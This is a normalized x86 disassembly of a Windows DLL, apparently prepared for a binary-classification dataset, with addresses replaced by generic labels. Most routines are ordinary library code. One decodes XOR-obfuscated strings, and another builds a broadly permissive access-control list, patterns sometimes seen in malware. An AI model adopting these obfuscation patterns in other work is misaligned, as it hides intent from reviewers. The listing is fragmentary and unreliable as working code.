lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1000aecf
push edi
push ebx
lea ecx [ ebp - 0x4c ]
call sub_100550c4
mov ecx [ ebp - 0x50 ]
lea eax [ ebp - 0x2c ]
push eax
call sub_1004ff82
push esi
push edi
push eax
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x4 ] 0x3
call sub_1001e620
push edi
push ebx
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] bl
call sub_1000aecf
cmp [ ebp - 0x38 ] 0x8
mov eax [ ebp - 0x4c ]
jae r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100081b8
test al al
mov eax [ ebp - 0x58 ]
je r-xdata
cmp [ ebp - 0x5c ] edi
jne r-xdata
push eax
push 0x2
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1004dca7
add esp 0x10
push edi
push ebx
lea ecx [ ebp - 0x4c ]
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x4 ] esi
call sub_1000aecf
jmp r-xdata
lea eax [ ebp - 0x4c ]
cmp [ ebp - 0x50 ] edi
jge r-xdata
or [ eax ] ebx
cmp esi ebx
ja r-xdata
mov ecx [ ebp - 0x6c ]
setne al
mov [ ecx ] al
or [ eax ] 0x2
jmp r-xdata
mov [ ebp - 0x50 ] esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x68 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_1004fa89
retn 0x20
sub_10052530
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10005296
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_10052557
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x1c ]
push esi
push edi
mov edi [ ebp + 0x18 ]
mov esi ebx
sub eax edi
mov esi eax
jmp r-xdata
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
pop esi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop ebx
leave
retn
cmp [ ebp + 0x20 ] 0x0
je r-xdata
push esi
push edi
push [ ebp + 0x14 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_100614ea
mov ecx [ eax ]
mov [ ebp + 0x10 ] ecx
mov ecx [ eax + 0x4 ]
add esp 0x18
add edi esi
sub ebx esi
mov [ ebp + 0x14 ] ecx
je r-xdata
inc edi
dec ebx
jmp r-xdata
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push [ ebp + 0x20 ]
mov [ ebp - 0x8 ] ecx
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] eax
call sub_1002c59e
mov eax [ ebp - 0x8 ]
mov [ ebp + 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp + 0x14 ] eax
push ebx
push 0x0
push edi
call sub_10079480
add esp 0xc
test eax eax
je r-xdata
sub_100525f0
push ebp
mov ebp esp
push ecx
mov edx [ ecx + 0x4 ]
mov eax [ edx + 0x4 ]
cmp [ eax + 0x15 ] 0x0
push edi
mov edi [ ebp + 0xc ]
jne r-xdata
mov eax [ ecx + 0x4 ]
mov [ ebp + 0xc ] edx
cmp edx eax
je r-xdata
push esi
mov esi [ edi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop edi
mov esp ebp
pop ebp
retn 0x8
mov ecx [ edi ]
cmp ecx [ edx + 0xc ]
jb r-xdata
mov edx eax
mov eax [ eax ]
mov eax [ eax + 0x8 ]
jmp r-xdata
lea eax [ ebp + 0xc ]
mov edx [ eax ]
mov eax [ ebp + 0x8 ]
mov [ eax ] edx
pop edi
mov esp ebp
pop ebp
retn 0x8
cmp [ eax + 0xc ] esi
jae r-xdata
pop esi
cmp [ eax + 0x15 ] 0x0
je r-xdata
sub_10052652
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
mov eax [ ecx ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
push edx
call [ eax + 0xc ]
mov ecx eax
call sub_1006189f
leave
retn 0x8
sub_10052680
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffbb
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x5d
and edx 0xff
mov [ ebp + eax * 2 - 0x20 ] dx
inc eax
cmp eax 0x7
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x12 ] ax
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0x24
and edx 0xff
mov [ ebp + eax * 2 - 0x30 ] dx
inc eax
cmp eax 0x6
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x30 ]
xor eax eax
push ecx
mov [ ebp - 0x24 ] ax
call esi
lea edx [ ebp - 0x20 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_100796a0
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_100796a0
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x20 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x20 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_100796a0
add esp 0xc
lea eax [ ebp - 0x20 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_100796a0
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x30 ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x30 ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_100796a0
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
sub_10052810
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
cmp edi eax
jne r-xdata
cmp edi 0x71c71c7
jbe r-xdata
xor al al
retn
mov ecx edi
call sub_10003bb0
lea ecx [ edi + edi * 8 ]
lea edx [ eax + ecx * 4 ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] edx
mov al 0x1
retn
push r--data
call sub_1002c5ed
sub_1005284b
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_10079a10
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_1007d0f0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_100317fa
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ edi + 0x8f ] bl
jmp r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_100317fa
add esp 0x10
test eax eax
jne r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp bl 0x2c
je r-xdata
call sub_100492ed
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_1007d0f0
test eax eax
sub_10052970
push ebp
mov ebp esp
push 0xffffffff
push sub_10081ce9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x10 ] eax
xor ecx ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] eax
mov [ esi ] cx
mov edx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ edx + 0x10 ]
add eax [ ebx + 0x10 ]
mov edi [ esi + 0x10 ]
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_10043930
push 0xffffffff
push 0x0
push ebx
mov ecx esi
call sub_10043930
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10003d30
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor ecx ecx
mov [ eax + edi * 2 ] cx
sub_10052a20
push ebp
mov ebp esp
and esp 0xfffffff8
mov ecx [ edx + 0x3c4 ]
push esi
mov esi [ edx + 0x3c0 ]
push edi
mov edi eax
xor eax eax
cmp esi ecx
je r-xdata
mov esi [ edx + 0x3a0 ]
mov edx [ edx + 0x3a4 ]
cmp esi edx
je r-xdata
cmp [ esi ] edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi ]
cmp edi [ ecx ]
je r-xdata
cmp esi ecx
je r-xdata
add esi 0x8
cmp esi ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
push ebx
push edx
add ecx 0x20
push ecx
call sub_10050e10
mov ecx [ esi ]
mov eax [ ecx + 0x28 ]
add esi 0x4
cmp esi edx
jne r-xdata
mov ecx [ edx + 0x3d0 ]
mov edi [ edx + 0x3b0 ]
mov edx [ edx + 0x3b4 ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
dec ecx
add eax edx
cmp eax ecx
ja r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ecx + ecx * 8 ]
mov eax [ edi + ecx * 4 + 0x20 ]
lea edx [ edi + ecx * 4 ]
mov ecx [ esi + 0x4 ]
cmp ecx eax
jae r-xdata
push r--data
call sub_10050437
xor eax eax
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea edi [ ecx + ebx ]
cmp edi eax
jae r-xdata
sub eax ecx
mov edi eax
mov edi ebx
jmp r-xdata
mov edx [ edx + 0x1c ]
mov eax [ ebp + 0x8 ]
push edi
add edx ecx
push edx
push eax
call sub_100796a0
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10052b20
push ebp
mov ebp esp
xor eax eax
test ecx ecx
je r-xdata
mov eax 0x80070057
cmp ecx 0x7fffffff
jbe r-xdata
pop ebp
retn
push ebx
push esi
lea esi [ ecx - 0x1 ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
push ecx
push esi
push edi
xor ebx ebx
call sub_1005a25e
add esp 0x10
test eax eax
js r-xdata
test eax eax
js r-xdata
mov [ esi + edi ] bl
mov ebx 0x8007007a
cmp eax esi
ja r-xdata
jne r-xdata
pop esi
mov eax ebx
pop ebx
mov [ esi + edi ] bl
pop esi
mov eax ebx
pop ebx
pop ebp
retn
sub_10052b74
push 0xc
push r--data
call sub_10079bf0
push 0xe
call sub_10043f7b
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10052bdb
call sub_10079c35
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_10022b5a
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_10022b5a
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_10052bf0
push ebp
mov ebp esp
push 0xffffffff
push sub_10082441
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0xc ]
lea edi [ ecx + 0x10 ]
lea esp [ esp ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
add esi 0x24
add edi 0x24
jmp r-xdata
mov ebx 0x7
xor ecx ecx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x10 ] 0x0
mov [ esi ] cx
cmp esi eax
je r-xdata
lea eax [ edi - 0x10 ]
cmp eax [ ebp + 0x8 ]
je r-xdata
mov edx [ edi + 0xc ]
mov [ esi + 0x1c ] edx
mov eax [ edi + 0x10 ]
mov [ esi + 0x20 ] eax
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x14 ] ebx
xor edx edx
mov [ esi + 0x10 ] 0x0
mov [ esi ] dx
cmp [ edi + 0x4 ] 0x8
lea ebx [ edi - 0x10 ]
jae r-xdata
mov eax [ esi ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebx ]
mov [ esi ] ecx
mov [ ebx ] edx
mov eax [ edi ]
inc eax
add eax eax
push eax
push ebx
push esi
call sub_10078db0
add esp 0xc
jmp r-xdata
mov edx [ edi ]
mov [ esi + 0x10 ] edx
mov eax [ edi + 0x4 ]
mov [ esi + 0x14 ] eax
xor ecx ecx
mov [ edi + 0x4 ] 0x7
mov [ edi ] 0x0
mov [ ebx ] cx
sub_10052cd5
push 0x28
mov eax sub_1007f2ec
call sub_100097c8
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x3
pop eax
call sub_1004db01
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x10
call sub_10055606
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10039680
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_1004d460
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
call sub_1000a66f
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
sub_10052d6e
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
push esi
mov esi [ rw-data ]
jne r-xdata
push edi
test esi esi
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop esi
pop ebp
retn
xor eax eax
push [ ebp + 0x8 ]
call sub_10079b60
pop ecx
mov edi eax
jmp r-xdata
call sub_1001ceb1
test eax eax
jne r-xdata
mov eax [ esi ]
test eax eax
jne r-xdata
mov esi [ rw-data ]
test esi esi
je r-xdata
push eax
call sub_10079b60
pop ecx
cmp eax edi
jbe r-xdata
add esi 0x4
mov eax [ esi ]
cmp [ eax + edi ] 0x3d
jne r-xdata
push edi
push [ ebp + 0x8 ]
push eax
call sub_10058f99
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi ]
lea eax [ eax + edi + 0x1 ]
jmp r-xdata
pop edi
sub_10052e0c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
push [ esi + 0x4 ]
call sub_10022b5a
push [ esi + 0x8 ]
call sub_10022b5a
push [ esi + 0xc ]
call sub_10022b5a
push [ esi + 0x10 ]
call sub_10022b5a
push [ esi + 0x14 ]
call sub_10022b5a
push [ esi + 0x18 ]
call sub_10022b5a
push [ esi ]
call sub_10022b5a
push [ esi + 0x20 ]
call sub_10022b5a
push [ esi + 0x24 ]
call sub_10022b5a
push [ esi + 0x28 ]
call sub_10022b5a
push [ esi + 0x2c ]
call sub_10022b5a
push [ esi + 0x30 ]
call sub_10022b5a
push [ esi + 0x34 ]
call sub_10022b5a
push [ esi + 0x1c ]
call sub_10022b5a
push [ esi + 0x38 ]
call sub_10022b5a
push [ esi + 0x3c ]
call sub_10022b5a
add esp 0x40
push [ esi + 0x40 ]
call sub_10022b5a
push [ esi + 0x44 ]
call sub_10022b5a
push [ esi + 0x48 ]
call sub_10022b5a
push [ esi + 0x4c ]
call sub_10022b5a
push [ esi + 0x50 ]
call sub_10022b5a
push [ esi + 0x54 ]
call sub_10022b5a
push [ esi + 0x58 ]
call sub_10022b5a
push [ esi + 0x5c ]
call sub_10022b5a
push [ esi + 0x60 ]
call sub_10022b5a
push [ esi + 0x64 ]
call sub_10022b5a
push [ esi + 0x68 ]
call sub_10022b5a
push [ esi + 0x6c ]
call sub_10022b5a
push [ esi + 0x70 ]
call sub_10022b5a
push [ esi + 0x74 ]
call sub_10022b5a
push [ esi + 0x78 ]
call sub_10022b5a
push [ esi + 0x7c ]
call sub_10022b5a
add esp 0x40
push [ esi + 0x80 ]
call sub_10022b5a
push [ esi + 0x84 ]
call sub_10022b5a
push [ esi + 0x88 ]
call sub_10022b5a
push [ esi + 0x8c ]
call sub_10022b5a
push [ esi + 0x90 ]
call sub_10022b5a
push [ esi + 0x94 ]
call sub_10022b5a
push [ esi + 0x98 ]
call sub_10022b5a
push [ esi + 0x9c ]
call sub_10022b5a
push [ esi + 0xa0 ]
call sub_10022b5a
push [ esi + 0xa4 ]
call sub_10022b5a
push [ esi + 0xa8 ]
call sub_10022b5a
push [ esi + 0xbc ]
call sub_10022b5a
push [ esi + 0xc0 ]
call sub_10022b5a
push [ esi + 0xc4 ]
call sub_10022b5a
push [ esi + 0xc8 ]
call sub_10022b5a
push [ esi + 0xcc ]
call sub_10022b5a
add esp 0x40
push [ esi + 0xd0 ]
call sub_10022b5a
push [ esi + 0xb8 ]
call sub_10022b5a
push [ esi + 0xd8 ]
call sub_10022b5a
push [ esi + 0xdc ]
call sub_10022b5a
push [ esi + 0xe0 ]
call sub_10022b5a
push [ esi + 0xe4 ]
call sub_10022b5a
push [ esi + 0xe8 ]
call sub_10022b5a
push [ esi + 0xec ]
call sub_10022b5a
push [ esi + 0xd4 ]
call sub_10022b5a
push [ esi + 0xf0 ]
call sub_10022b5a
push [ esi + 0xf4 ]
call sub_10022b5a
push [ esi + 0xf8 ]
call sub_10022b5a
push [ esi + 0xfc ]
call sub_10022b5a
push [ esi + 0x100 ]
call sub_10022b5a
push [ esi + 0x104 ]
call sub_10022b5a
push [ esi + 0x108 ]
call sub_10022b5a
add esp 0x40
push [ esi + 0x10c ]
call sub_10022b5a
push [ esi + 0x110 ]
call sub_10022b5a
push [ esi + 0x114 ]
call sub_10022b5a
push [ esi + 0x118 ]
call sub_10022b5a
push [ esi + 0x11c ]
call sub_10022b5a
push [ esi + 0x120 ]
call sub_10022b5a
push [ esi + 0x124 ]
call sub_10022b5a
push [ esi + 0x128 ]
call sub_10022b5a
push [ esi + 0x12c ]
call sub_10022b5a
push [ esi + 0x130 ]
call sub_10022b5a
push [ esi + 0x134 ]
call sub_10022b5a
push [ esi + 0x138 ]
call sub_10022b5a
push [ esi + 0x13c ]
call sub_10022b5a
push [ esi + 0x140 ]
call sub_10022b5a
push [ esi + 0x144 ]
call sub_10022b5a
push [ esi + 0x148 ]
call sub_10022b5a
add esp 0x40
push [ esi + 0x14c ]
call sub_10022b5a
push [ esi + 0x150 ]
call sub_10022b5a
push [ esi + 0x154 ]
call sub_10022b5a
push [ esi + 0x158 ]
call sub_10022b5a
push [ esi + 0x15c ]
call sub_10022b5a
push [ esi + 0x160 ]
call sub_10022b5a
add esp 0x18
sub_100531b0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
push edi
mov esi ecx
test eax eax
je r-xdata
mov edi [ ebp + 0xc ]
cmp edi 0x7ffffffe
jbe r-xdata
mov edx [ esi + 0x14 ]
cmp edx 0x8
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_1002c5ed
cmp eax ecx
jb r-xdata
mov ecx [ esi ]
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_1004d170
test edi edi
je r-xdata
cmp edx 0x8
jb r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x8
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
xor ecx ecx
pop edi
mov [ eax ] cx
pop esi
pop ebp
retn 0x8
mov eax [ esi ]
xor ecx ecx
mov [ eax ] cx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
cmp edx 0x8
jb r-xdata
mov edi [ esi + 0x10 ]
lea ecx [ ecx + edi * 2 ]
cmp ecx eax
jbe r-xdata
mov eax esi
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
mov eax [ esi ]
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ ebp + 0x8 ]
push ebx
lea ebx [ edi + edi ]
push ebx
push edx
push eax
call sub_100796a0
add esp 0xc
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx esi
mov ecx [ esi ]
jmp r-xdata
mov edx [ ebp + 0xc ]
sub eax ecx
push edx
sar eax 0x1
push eax
push esi
mov ecx esi
call sub_10019180
pop edi
pop esi
pop ebp
retn 0x8
sub_100532a0
push 0xc
push r--data
call sub_10079bf0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_10079c35
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10053336
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_10053340
mov eax [ esi ]
push edi
mov edi [ LocalFree@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
push eax
call edi
mov [ esi ] 0x0
pop edi
retn
push eax
call edi
mov [ esi + 0x4 ] 0x0
sub_10053369
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
jbe r-xdata
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x10 ]
call sub_1006a508
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_1004fd6f
push 0x16
pop esi
mov [ eax ] esi
call sub_1001d849
xor eax eax
jmp r-xdata
mov [ eax ] ebx
lea ecx [ ebp + 0xc ]
push ecx
push ebx
push edi
push esi
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push ebx
mov [ ebp + 0xc ] ebx
push [ eax + 0x4 ]
call [ WideCharToMultiByte@IAT ]
cmp eax ebx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp + 0xc ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
cmp esi ebx
je r-xdata
call sub_1004fd6f
mov [ eax ] 0x2a
call sub_1004fd6f
mov eax [ eax ]
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax ebx
je r-xdata
cmp edi ebx
ja r-xdata
cmp edi ebx
jbe r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
call sub_1004fd6f
push 0x22
pop esi
mov [ eax ] esi
call sub_1001d849
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp edi ebx
jbe r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov [ ecx ] eax
jmp r-xdata
mov [ eax ] 0x1
mov [ esi ] al
push edi
push ebx
push esi
call sub_10079a10
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
push edi
push ebx
push esi
call sub_10079a10
add esp 0xc
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
jmp r-xdata
sub_100534c0
push ebp
mov ebp esp
sub esp 0x48
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x100
cmp eax ebx
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x8 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
call [ GetProcessHeap@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x1
lea ecx [ ebp - 0x10 ]
push ecx
call [ AllocateAndInitializeSid@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
xor eax eax
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x38 ] eax
lea eax [ ebp - 0x1c ]
push eax
push ebx
lea ecx [ ebp - 0x48 ]
push ecx
push 0x1
mov [ ebp - 0x48 ] 0x1f0001
mov [ ebp - 0x44 ] 0x2
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x30 ] 0x5
mov [ ebp - 0x2c ] edx
call [ SetEntriesInAclW@IAT ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x14 ]
push edx
call [ FreeSid@IAT ]
push 0x14
push 0x8
push edi
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
jne r-xdata
push 0x1
push esi
